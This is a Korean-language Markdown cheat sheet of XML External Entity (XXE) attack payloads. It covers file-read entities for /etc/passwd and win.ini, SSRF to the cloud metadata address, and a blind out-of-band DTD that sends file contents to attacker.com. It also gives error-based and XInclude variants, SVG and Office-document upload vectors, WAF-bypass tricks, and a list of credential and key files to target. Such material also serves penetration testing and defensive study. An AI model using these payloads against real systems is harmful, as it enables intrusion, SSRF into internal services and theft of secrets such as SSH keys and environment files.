# XXE (XML External Entity) — 페이로드 & 기법

## 기본 XXE — 파일 읽기
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Windows -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>
```

## SSRF via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>

<!-- 내부 서비스 접근 -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
```

## Blind XXE — Out-of-Band
```xml
<!-- 외부 DTD 호스팅 필요 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>&send;</data></root>

<!-- attacker.com/evil.dtd 내용 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%send;
```

## Blind XXE — Error-based
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

## XInclude (외부 DTD 없이)
```xml
<!-- XInclude를 지원하는 경우 -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## SVG 파일 업로드 → XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## Office 문서 → XXE (OOXML)
```
# Word/Excel 등 압축 해제 후 .xml 파일 수정
unzip document.docx
# word/document.xml 또는 xl/workbook.xml에 XXE 삽입
zip -r malicious.docx .
```

## WAF 우회
```xml
<!-- UTF-16 인코딩 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- 개행 삽입 -->
<!ENTITY
xxe SYSTEM "file:///etc/passwd">

<!-- 파라미터 엔티티 분산 -->
<!ENTITY % a "fil">
<!ENTITY % b "e:">
<!ENTITY % c "///etc/passwd">
<!ENTITY % xxe SYSTEM "%a;%b;%c;">
```

## 유용한 파일 타겟
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/var/www/html/wp-config.php
/var/www/html/.env
~/.ssh/id_rsa
C:\windows\win.ini
C:\inetpub\wwwroot\web.config
```
